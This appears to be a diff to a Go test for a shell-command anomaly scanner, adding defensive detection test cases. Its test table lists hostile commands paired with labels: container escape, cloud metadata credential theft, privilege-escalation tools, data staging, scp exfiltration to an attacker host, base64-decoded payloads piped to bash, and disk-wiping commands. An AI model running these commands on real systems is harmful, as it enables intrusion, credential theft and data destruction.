@@ -211,6 +211,18 @@ func TestScanAnomaliesCatalog(t *testing.T) {
 		{"iptables -F", "shell-disable-fw"},
 		{"setenforce 0", "shell-disable-fw"},
 		{"cat /root/.aws/credentials", "shell-creds-file-access"},
+		// New TTP detections.
+		{"docker run -v /:/host -it alpine chroot /host sh", "shell-container-escape"},
+		{"nsenter -t 1 -m -u -n -i sh", "shell-container-escape"},
+		{"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/", "shell-cloud-cred-theft"},
+		{"aws sts get-caller-identity", "shell-cloud-cred-theft"},
+		{"./pwnkit", "shell-local-exploit"},
+		{"wget http://x/linpeas.sh", "shell-local-exploit"},
+		{"tar czf /tmp/loot.tar.gz /home", "shell-data-staged"},
+		{"scp /tmp/loot.tar.gz attacker@1.2.3.4:/x", "shell-exfil-channel"},
+		{"echo aGVsbG8= | base64 -d | bash", "shell-decode-pipe-exec"},
+		{"rm -rf / --no-preserve-root", "shell-destruction"},
+		{"dd if=/dev/zero of=/dev/sda", "shell-destruction"},
 	}
 	for _, c := range cases {
 		got := scanAnomalies(c.in)
